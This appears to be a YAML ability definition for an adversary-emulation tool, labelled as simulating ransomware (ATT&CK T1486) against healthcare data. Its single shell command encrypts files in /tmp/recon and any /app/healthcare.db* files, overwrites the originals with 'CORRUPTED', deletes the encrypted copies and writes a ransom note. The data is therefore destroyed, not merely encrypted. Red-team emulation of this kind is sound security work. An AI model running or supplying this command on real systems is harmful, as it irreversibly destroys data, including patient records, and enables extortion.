- id: "impact-sim-encrypt"
  name: "Encrypt Collected Data"
  description: "Encrypts collected healthcare data and drops a ransom note."
  tactic: "impact"
  technique:
    attack_id: "T1486"
    name: "Data Encrypted for Impact"
  platforms:
    linux:
      sh:
        timeout: 120
        command: |
          OUTDIR="/tmp/recon"; R_KEY="RansomKey_$(hostname)_$(date +%s)"; K_FILE="$OUTDIR/.ransom_key"; COUNT=0; if [ ! -d "$OUTDIR" ]; then exit 1; fi; echo "$R_KEY" > "$K_FILE"; for f in "$OUTDIR"/*.json "$OUTDIR"/*.tar.gz /app/healthcare.db*; do [ -f "$f" ] || continue; if openssl enc -aes-256-cbc -pbkdf2 -pass "pass:$R_KEY" -in "$f" -out "$f.enc" 2>/dev/null; then mv "$f.enc" "$f.ransom"; echo "CORRUPTED" > "$f"; rm -f "$f.ransom"; COUNT=$((COUNT+1)); fi; done; if [ "$COUNT" -eq 0 ]; then exit 1; fi; echo "FILES ENCRYPTED. Key: $R_KEY" > "$OUTDIR/README_DECRYPT.txt"